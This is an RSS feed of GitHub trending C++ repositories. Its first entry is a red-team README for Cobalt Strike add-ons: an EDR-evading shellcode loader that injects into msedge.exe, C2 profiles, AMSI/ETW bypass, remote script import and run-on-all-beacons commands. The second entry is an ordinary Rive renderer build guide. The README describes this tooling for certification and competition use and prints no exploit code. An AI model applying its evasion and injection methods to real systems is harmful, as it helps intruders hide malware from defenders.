<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C++ Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-03-22T01:23:24Z</updated>
  <subtitle>Daily Trending of C++ in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>RedefiningReality/Cobalt-Strike</title>
    <updated>2024-03-22T01:23:24Z</updated>
    <id>tag:github.com,2024-03-22:/RedefiningReality/Cobalt-Strike</id>
    <link href="https://github.com/RedefiningReality/Cobalt-Strike" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Various resources to enhance Cobalt Strike&#39;s functionality and its ability to evade antivirus/EDR detection&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Cobalt Strike Resources&lt;/h1&gt; &#xA;&lt;p&gt;Various resources to enhance Cobalt Strike&#39;s functionality and its ability to evade antivirus/EDR detection. Includes the custom tooling I used when pursuing the Certified Red Team Lead (CRTL) certification.&lt;/p&gt; &#xA;&lt;p&gt;For my Red Team Ops I and II cheat sheets, check out my &lt;a href=&#34;https://github.com/RedefiningReality/Cheatsheets&#34;&gt;cheat sheets repo&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Contents&lt;/h3&gt; &#xA;&lt;h4&gt;Loader&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/loader/&#34;&gt;loader&lt;/a&gt; ⇒ used to bypass Windows Defender and Elastic EDR detections to run Cobalt Strike beacon shellcode &lt;code&gt;&amp;lt;protocol&amp;gt;_x64.xprocess.bin&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;uses NtMapViewOfSection technique for shellcode injection&lt;/li&gt; &#xA;   &lt;li&gt;spawns and injects into msedge.exe by default, though you could easily change this&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Profile&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/profile/crtl.profile&#34;&gt;crtl.profile&lt;/a&gt; ⇒ malleable C2 profile used on CRTL exam, based on &lt;a href=&#34;https://github.com/Cobalt-Strike/Malleable-C2-Profiles/raw/master/normal/webbug.profile&#34;&gt;webbug.profile&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/profile/mwccdc.profile&#34;&gt;mwccdc.profile&lt;/a&gt; ⇒ malleable C2 profile used for MWCCDC regionals in 2024, based on &lt;a href=&#34;https://github.com/Cobalt-Strike/Malleable-C2-Profiles/raw/master/normal/microsoftupdate_getonly.profile&#34;&gt;microsoftupdate_getonly.profile&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Kits&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/kits/sleepmask/&#34;&gt;sleepmask&lt;/a&gt; ⇒ Cobalt Strike sleep mask kit modifications to spoof legitimate msedge.exe thread callstack&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/kits/process_inject/&#34;&gt;process_inject&lt;/a&gt; ⇒ Cobalt Strike process injection kit modifications that implement NtMapViewOfSection technique - not necessary since this option is available in the malleable C2 profile, but it&#39;s a good example of how to use kernel32.dll and ntdll.dll Windows API function calls to create your own injection. I found concrete examples of this to be severely lacking on the internet.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Post-Ex&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/post-ex/powerpick.cs&#34;&gt;powerpick.cs&lt;/a&gt; ⇒ C# code for running unmanaged PowerShell, providing the PowerShell command as an argument(s) - compatible with inline-x.cna&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/post-ex/inline-x.cna&#34;&gt;inline-x.cna&lt;/a&gt; ⇒ modified &lt;a href=&#34;https://github.com/anthemtotheego/InlineExecute-Assembly&#34;&gt;inlineExecute-Assembly&lt;/a&gt; cna file that makes running .NET assemblies and PowerShell inline easier&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/post-ex/command-all.cna&#34;&gt;command-all.cna&lt;/a&gt; ⇒ execute &lt;code&gt;run&lt;/code&gt; or &lt;code&gt;shell&lt;/code&gt; command on &lt;em&gt;all&lt;/em&gt; active Cobalt Strike beacons, without having to interact with each one individually&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; When building powerpick.cs, you&#39;ll have to add a reference to &lt;strong&gt;System.Management.Automation.dll&lt;/strong&gt;, which is located in &lt;code&gt;C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\&amp;lt;version&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Loader Usage&lt;/h3&gt; &#xA;&lt;h4&gt;Two executable types:&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;EXE ⇒ standard Windows executable&lt;/li&gt; &#xA; &lt;li&gt;Service ⇒ Windows service executable&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/loader/main/beaconsvc.cpp&#34;&gt;beaconsvc.cpp&lt;/a&gt; gets caught by Elastic static detection when compiled, so you might have to modify it. You can also run the standard EXE as a service, and it&#39;ll throw an error but still spawn the beacon.&lt;/p&gt; &#xA;&lt;h4&gt;Three loader variants:&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download Stager ⇒ download shellcode from file hosted on Cobalt Strike team server over HTTPS&lt;/li&gt; &#xA; &lt;li&gt;Read Stager ⇒ read shellcode from disk, by default C:\Windows\beacon.bin but you can change this&lt;/li&gt; &#xA; &lt;li&gt;Stageless ⇒ include shellcode directly in PE as a resource (in .rsrc section) - requires encoding the shellcode so it&#39;s not caught by EDR&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h4&gt;Building the loader&lt;/h4&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;(stageless only) generate encoded Cobalt Strike shellcode file with &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/loader/helpers/encoder.py&#34;&gt;encoder.py&lt;/a&gt; - see comments for more info&lt;/li&gt; &#xA; &lt;li&gt;open &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/loader/loader.sln&#34;&gt;.sln&lt;/a&gt; file in &lt;a href=&#34;https://visualstudio.microsoft.com/free-developer-offers/&#34;&gt;Visual Studio&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;(stageless only) follow instructions in &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/loader/helpers/encoder.py&#34;&gt;encoder.py&lt;/a&gt; to include encoded shellcode file as a resource&lt;/li&gt; &#xA; &lt;li&gt;select your desired build&lt;/li&gt; &#xA; &lt;li&gt;Build Solution&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Inline X Usage&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Change &lt;code&gt;$powerpickPath&lt;/code&gt; to specify the path of your unmanaged PowerShell exe (built from &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/post-ex/powerpick.cs&#34;&gt;powerpick.cs&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Change &lt;code&gt;$etw&lt;/code&gt; and &lt;code&gt;$amsi&lt;/code&gt; as you see fit - I wanted it to always bypass AMSI and ETW, which is why I set these values to 1, though someone could argue this creates additional telemetry in cases where the AMSI/ETW bypass isn&#39;t necessary, and for this reason it&#39;s better to leave the default values at 0.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_cs-scripting.htm&#34;&gt;Load script&lt;/a&gt; into Cobalt Strike&lt;/li&gt; &#xA; &lt;li&gt;Execute .NET assembly inline with &lt;code&gt;x execute-assembly &amp;lt;exe&amp;gt; &amp;lt;args&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Execute unmanaged PowerShell inline with &lt;code&gt;x powerpick &amp;lt;powershell&amp;gt;&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;I made this compatible with &lt;code&gt;powershell-import&lt;/code&gt;, but I noticed that using this method of importing scripts generally gets detected by EDR. If you&#39;d like to remove this functionality altogether, comment/remove lines 74-76.&lt;/li&gt; &#xA;   &lt;li&gt;As an alternative, use &lt;code&gt;--import &amp;lt;script&amp;gt;&lt;/code&gt; (eg. &lt;code&gt;x --import https://example.com/PowerView.ps1 powerpick Get-Domain&lt;/code&gt;). You can specify a local file on disk or remotely hosted file with http/https. This only supports importing &lt;em&gt;one&lt;/em&gt; PowerShell script. I&#39;m too lazy to extend the functionality to support multiple scripts when one per command is usually all you need.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; I commented out the portions of the script that parse arguments in single (&#39;) and double quotes (&#34;) as a single argument because most of my tooling handles or requires these quotes. For example, the unmanaged PowerShell implementation &lt;a href=&#34;https://raw.githubusercontent.com/RedefiningReality/Cobalt-Strike/main/post-ex/powerpick.cs&#34;&gt;powerpick.cs&lt;/a&gt; takes arguments passed in, converts them to one string, and runs that string. Treating multiple words as a single argument in PowerShell commands thus requires passing in those quotes as-is. You may run into instances where you &lt;em&gt;do&lt;/em&gt; need to parse arguments in quotes as a single argument, much like you would providing quotes when running the .NET executable in a terminal. If this is the case, you are welcome to uncomment the code portions starting on line 87 and reload the script. In case you decide to do this, I modified the conditional (if statement) so it continues to pass quotes in as-is when running powerpick.&lt;/p&gt; &#xA;&lt;h3&gt;Command All Usage&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_cs-scripting.htm&#34;&gt;Load script&lt;/a&gt; into Cobalt Strike&lt;/li&gt; &#xA; &lt;li&gt;Open Script Console&lt;/li&gt; &#xA; &lt;li&gt;Execute &lt;code&gt;run&lt;/code&gt; on all active beacons with &lt;code&gt;run_all &amp;lt;exe&amp;gt; &amp;lt;args&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Execute &lt;code&gt;shell&lt;/code&gt; on all active beacons with &lt;code&gt;shell_all &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Credit&lt;/h3&gt; &#xA;&lt;p&gt;My experience with AV/EDR evasion techniques and Cobalt Strike comes from the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii&#34;&gt;Zero-Point Security Red Team Ops II&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://maldevacademy.com&#34;&gt;Maldev Academy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cssia.org/mwccdc/&#34;&gt;Midwest Regional Collegiate Cyber Defense Competition&lt;/a&gt; (I&#39;m a red team volunteer)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;I also recommend checking out the &lt;a href=&#34;https://institute.sektor7.net&#34;&gt;Sektor7 Institute&lt;/a&gt; courses.&lt;/p&gt; &#xA;&lt;p&gt;Two additional Beacon Object Files I found very useful that I wanted to give a shoutout to, both by &lt;a href=&#34;https://trustedsec.com&#34;&gt;TrustedSec&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trustedsec/CS-Situational-Awareness-BOF&#34;&gt;Situational Awareness&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trustedsec/CS-Remote-OPs-BOF&#34;&gt;Remote Operations&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Copyright Disclaimer&lt;/h3&gt; &#xA;&lt;p&gt;I was careful to avoid any copyright infringement with the resources I publicly provided in this repo. Here are two areas where copyright might come into question:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;I include my modifications to the Cobalt Strike process injection and sleep mask kits from Fortra, which are closed-source. However, I only provided files to which I made modifications, and I replaced all portions of the code that were not my own with a comment stating &lt;em&gt;redacted&lt;/em&gt;. Should you choose to use these resources, you&#39;ll have to copy my code portions over from this repo to the corresponding files in the kits.&lt;/li&gt; &#xA; &lt;li&gt;In my loader, I included code taken directly from the Zero-Point Security Red Team Ops II course. However, this code is publicly available and easily-obtainable online as well. Telling ChatGPT to &#34;write C++ code using WinHTTP to download a file and save it to an std::vector&amp;lt;BYTE&amp;gt;&#34; yields almost the exact same code for the Download function, and the NtMapViewOfSection technique is &lt;a href=&#34;https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection&#34;&gt;publicly documented&lt;/a&gt; in various locations, making use of the same Windows API function calls in the same order. Also keep in mind this repo doesn&#39;t come close to being a substitute for &lt;a href=&#34;https://training.zeropointsecurity.co.uk/courses/red-team-ops-ii&#34;&gt;the course&lt;/a&gt; itself, which in my opinion is absolutely worth taking.&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>rive-app/rive-renderer</title>
    <updated>2024-03-22T01:23:24Z</updated>
    <id>tag:github.com,2024-03-22:/rive-app/rive-renderer</id>
    <link href="https://github.com/rive-app/rive-renderer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Downstream repo for Rive renderer&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Rive Renderer&lt;/h1&gt; &#xA;&lt;p&gt;The Rive Renderer is a vector and raster graphics renderer custom-built for Rive content, for animation, and for runtime.&lt;/p&gt; &#xA;&lt;p&gt;This repository contains the renderer code and an example for how to interface with it directly. The code within this repository does not contain a Rive runtime. It contains the best in class concrete implementation of Rive&#39;s rendering abstraction layer, which we call the Rive Renderer.&lt;/p&gt; &#xA;&lt;h2&gt;Clone this repo&lt;/h2&gt; &#xA;&lt;p&gt;Make sure to clone this repo with submodules!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone --recurse-submodules git@github.com:rive-app/rive-renderer.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Build GLFW&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd submodules/rive-cpp/skia/dependencies&#xA;./make_glfw.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Install Premake5&lt;/h2&gt; &#xA;&lt;p&gt;Grab the binary from the premake5 GitHub releases: &lt;a href=&#34;https://github.com/premake/premake-core/releases/&#34;&gt;https://github.com/premake/premake-core/releases/&lt;/a&gt; or you can build your own for Apple Silicon:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone --depth 1 --branch master https://github.com/premake/premake-core.git&#xA;cd premake-core&#xA;make -f Bootstrap.mak osx PLATFORM=ARM&#xA;# binaries will be in bin/release/* put them in your path&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Install Python PLY&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 -m pip install ply&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Call Premake &amp;amp; Build&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;PREMAKE_PATH=&#34;$(pwd)/submodules/rive-cpp/build&#34; premake5 gmake2 --with_rive_text --config=release --out=out/release&#xA;cd out/release&#xA;make -j20&#xA;# run path_fiddle&#xA;./path_fiddle [/path/to/my.riv]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Build and serve for WebGL2&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;PREMAKE_PATH=&#34;$(pwd)/submodules/rive-cpp/build&#34; premake5 gmake2 --with_rive_text --config=release --arch=wasm --out=out/wasm_release&#xA;cd out/wasm_release&#xA;# Ensure your emsdk_env is configured.&#xA;make -j20 path_fiddle&#xA;# serve to http://localhost:5555/&#xA;python3 -m http.server 5555&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Helpful keys&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;h&lt;/code&gt;/&lt;code&gt;H&lt;/code&gt;: add/subtract copies to the left and right (only when a .riv is provided)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;j&lt;/code&gt;/&lt;code&gt;J&lt;/code&gt;: add/subtract copies below (only when a .riv is provided)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;k&lt;/code&gt;/&lt;code&gt;K&lt;/code&gt;: add/subtract copies above (only when a .riv is provided)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;p&lt;/code&gt;: pause runtime (for benchmarking the renderer in isolation)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;a&lt;/code&gt;: toggle &#34;atomic&#34; mode&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>